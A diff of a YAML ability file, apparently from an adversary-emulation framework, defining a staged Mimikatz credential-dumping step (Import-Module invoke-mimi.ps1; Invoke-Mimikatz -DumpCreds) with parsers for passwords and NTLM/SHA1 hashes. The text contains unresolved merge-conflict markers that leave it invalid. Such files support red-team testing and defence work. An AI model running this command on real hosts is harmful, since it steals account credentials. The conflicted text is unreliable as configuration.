@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 ---
 - id: 7049e3ec-b822-4fdf-a4ac-18190f9b66d1
   name: Powerkatz (Staged)
@@ -10,11 +11,38 @@
     windows:
       psh:
         payload: invoke-mimi.ps1
+=======
+- id: 7049e3ec-b822-4fdf-a4ac-18190f9b66d1
+  name: Powerkatz (Staged)
+  description: Use Invoke-Mimikatz
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: Credential Dumping
+  privilege: Elevated
+  platforms:
+    windows:
+      psh:
+>>>>>>> a2b4f2d02f7a96ebd241898b844e9a36dfccc6be
         command: |
           Import-Module .\invoke-mimi.ps1;
           Invoke-Mimikatz -DumpCreds
         parsers:
           plugins.stockpile.app.parsers.katz:
+<<<<<<< HEAD
             - source: domain.user.name
               edge: has_password
               target: domain.user.password
+=======
+          - source: domain.user.name
+            edge: has_password
+            target: domain.user.password
+          - source: domain.user.name
+            edge: has_hash
+            target: domain.user.ntlm
+          - source: domain.user.name
+            edge: has_hash
+            target: domain.user.sha1
+        payloads:
+        - invoke-mimi.ps1
+>>>>>>> a2b4f2d02f7a96ebd241898b844e9a36dfccc6be
